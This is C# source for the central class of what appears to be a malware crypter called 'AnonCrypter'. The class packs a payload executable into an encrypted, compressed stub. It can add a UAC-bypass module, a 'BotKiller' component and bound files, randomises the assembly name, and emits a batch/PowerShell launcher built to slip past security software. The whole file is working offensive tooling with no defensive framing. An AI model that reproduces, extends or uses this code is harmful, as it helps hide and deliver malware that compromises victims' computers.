using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using AnonCrypter.Crypter;

namespace AnonCrypter.Crypter
{
    public class Crypter
    {
        public byte[] Key;
        public byte[] IV;
        private readonly StubGen _stubGen;

        public Crypter() => this._stubGen = new StubGen();

        public byte[] Process(byte[] payload, FileType ftype, CrypterOptions options)
        {
            try
            {
                this._stubGen.Key = this.Key;
                this._stubGen.IV = this.IV;
                bool mtaThread = false;
                bool isNative = ftype == FileType.x64 || ftype == FileType.x86;
                if (!isNative && !options.DropFile)
                    mtaThread = Patcher.IsMTAThread(payload);
                byte[] input = Compiler.Build(this._stubGen.CreateCS(options, isNative, mtaThread), new string[4]
                {
          "mscorlib.dll",
          "System.Core.dll",
          "System.dll",
          "System.Management.dll"
                });
                byte[] bytes = Compiler.Build(this._stubGen.CreateBCS(), new string[3]
                {
          "mscorlib.dll",
          "System.Core.dll",
          "System.dll"
                });
                List<EmbeddedResource> embeddedResourceList = new List<EmbeddedResource>()
        {
          new EmbeddedResource((UTF8String) "P", Utils.Compress(payload))
        };
                if (isNative)
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"LP", Utils.Compress(Resources.loadPE(FilesTable.LoadPEID))));
                if (options.UACBypass)
                {
                    string key = FilesTable.UACID;
                    if (ftype == FileType.NET64 || ftype == FileType.x64)
                        key = FilesTable.UAC64ID;
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"UAC", Utils.Compress(Resources.UAC(key))));
                }
                if (options.BotKiller)
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"BK", Utils.Compress(Resources.botKiller(FilesTable.BotKillerID))));
                foreach (string bindedFile in options.BindedFiles)
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)Path.GetFileName(bindedFile), Utils.Compress(File.ReadAllBytes(bindedFile))));
                Patcher.AddResources(ref input, embeddedResourceList.ToArray());
                Patcher.ChangeName(ref input, Randomiser.GetStringUnsafe(6) + "scrubb");
                return Encoding.ASCII.GetBytes(this._stubGen.CreateBat(this._stubGen.CreatePS(), ftype == FileType.x86 || ftype == FileType.NET86, Utils.Encrypt(Utils.Compress(input), this.Key, this.IV), Utils.Encrypt(Utils.Compress(bytes), this.Key, this.IV)));
            }
            finally
            {
                Randomiser.ClearStrings();
            }
        }

        public FileType GetFileType(string path)
        {
            try
            {
                return AssemblyName.GetAssemblyName(path).ProcessorArchitecture == ProcessorArchitecture.X86 ? FileType.NET86 : FileType.NET64;
            }
            catch
            {
                using (FileStream input = new FileStream(path, FileMode.Open, FileAccess.Read))
                {
                    using (BinaryReader binaryReader = new BinaryReader((Stream)input))
                    {
                        try
                        {
                            input.Seek(60L, SeekOrigin.Begin);
                            int offset = binaryReader.ReadInt32();
                            input.Seek((long)offset, SeekOrigin.Begin);
                            if (binaryReader.ReadUInt32() != 17744U)
                                throw new Exception();
                            return binaryReader.ReadUInt16() == (ushort)332 ? FileType.x86 : FileType.x64;
                        }
                        catch
                        {
                            return FileType.Invalid;
                        }
                    }
                }
            }
        }

        private enum MachineType : ushort
        {
            IMAGE_FILE_MACHINE_UNKNOWN = 0,
            IMAGE_FILE_MACHINE_I386 = 332, // 0x014C
            IMAGE_FILE_MACHINE_R4000 = 358, // 0x0166
            IMAGE_FILE_MACHINE_WCEMIPSV2 = 361, // 0x0169
            IMAGE_FILE_MACHINE_SH3 = 418, // 0x01A2
            IMAGE_FILE_MACHINE_SH3DSP = 419, // 0x01A3
            IMAGE_FILE_MACHINE_SH4 = 422, // 0x01A6
            IMAGE_FILE_MACHINE_SH5 = 424, // 0x01A8
            IMAGE_FILE_MACHINE_ARM = 448, // 0x01C0
            IMAGE_FILE_MACHINE_THUMB = 450, // 0x01C2
            IMAGE_FILE_MACHINE_AM33 = 467, // 0x01D3
            IMAGE_FILE_MACHINE_POWERPC = 496, // 0x01F0
            IMAGE_FILE_MACHINE_POWERPCFP = 497, // 0x01F1
            IMAGE_FILE_MACHINE_IA64 = 512, // 0x0200
            IMAGE_FILE_MACHINE_MIPS16 = 614, // 0x0266
            IMAGE_FILE_MACHINE_MIPSFPU = 870, // 0x0366
            IMAGE_FILE_MACHINE_MIPSFPU16 = 1126, // 0x0466
            IMAGE_FILE_MACHINE_EBC = 3772, // 0x0EBC
            IMAGE_FILE_MACHINE_AMD64 = 34404, // 0x8664
            IMAGE_FILE_MACHINE_M32R = 36929, // 0x9041
            IMAGE_FILE_MACHINE_ARM64 = 43620, // 0xAA64
        }
    }
}